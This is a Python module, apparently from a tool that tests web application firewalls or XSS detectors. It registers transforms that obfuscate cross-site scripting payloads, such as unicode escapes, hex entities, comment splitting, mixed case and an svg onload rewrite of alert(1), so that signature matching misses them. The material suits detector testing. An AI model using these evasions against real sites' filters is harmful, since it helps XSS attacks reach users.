"""Cross-site scripting payload obfuscation."""
from __future__ import annotations

from ..encodings import backslash_unicode
from . import Payload, register


@register(Payload(
    id="xss_unicode_escape", category="xss",
    explain="backslash-escape alert/script substrings (alert -> \\u0061... )",
    fidelity="differential",
))
def xss_unicode_escape(payload: str) -> str:
    """Escape ``alert`` and ``script`` so literal ASCII signatures vanish."""
    return payload.replace("alert", backslash_unicode("alert")) \
                  .replace("script", backslash_unicode("script"))


@register(Payload(
    id="xss_html_entity", category="xss",
    explain="replace angle brackets with hex entities (< -> &#x3C;)",
    fidelity="differential",
))
def xss_html_entity(payload: str) -> str:
    """Rewrite ``<``/``>`` as hex entities so tag signatures miss."""
    return payload.replace("<", "&#x3C;").replace(">", "&#x3E;")


@register(Payload(
    id="xss_js_concat", category="xss",
    explain="break alert( and script with unicode + /**/",
    fidelity="differential",
))
def xss_js_concat(payload: str) -> str:
    """Split ``alert(`` and ``script`` so contiguous anchors fail."""
    return payload.replace("alert(", "al\\u0065rt(") \
                  .replace("script", "scr/**/ipt")


@register(Payload(
    id="xss_mixed_case", category="xss",
    explain="mixed-case tag/function names (<sCrIpT>, aLerT)",
    fidelity="transparent",
))
def xss_mixed_case(payload: str) -> str:
    """Toggle case on tag and handler names; HTML/JS are case-insensitive there."""
    return payload.replace("<script>", "<sCrIpT>") \
                  .replace("alert", "aLerT")


@register(Payload(
    id="xss_tab_newline", category="xss",
    explain="insert tab/newline inside tag brackets",
    fidelity="differential",
))
def xss_tab_newline(payload: str) -> str:
    """Insert a tab after ``<`` and a newline after ``>`` to break tag regexes."""
    return payload.replace("<", "<\t").replace(">", ">\n")


@register(Payload(
    id="xss_svg_onload", category="xss",
    explain="rewrite <script>alert(1)</script> to <svg onload=alert(1)>",
    fidelity="differential",
))
def xss_svg_onload(payload: str) -> str:
    """Rewrite the canonical script tag as an svg onload handler."""
    if payload == "<script>alert(1)</script>":
        return "<svg onload=alert(1)>"
    return payload
